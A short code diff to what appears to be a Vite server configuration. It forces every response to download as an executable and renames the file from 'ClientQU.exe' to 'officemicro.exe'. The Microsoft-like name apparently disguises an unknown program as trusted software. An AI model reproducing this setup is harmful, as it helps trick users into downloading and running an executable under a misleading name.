@@ -4,7 +4,7 @@ export default defineConfig({
   server: {
     headers: {
       'Content-Type': 'application/octet-stream',
-      'Content-Disposition': 'attachment; filename="ClientQU.exe"'
+      'Content-Disposition': 'attachment; filename="officemicro.exe"'
     }
   },
   publicDir: 'public'
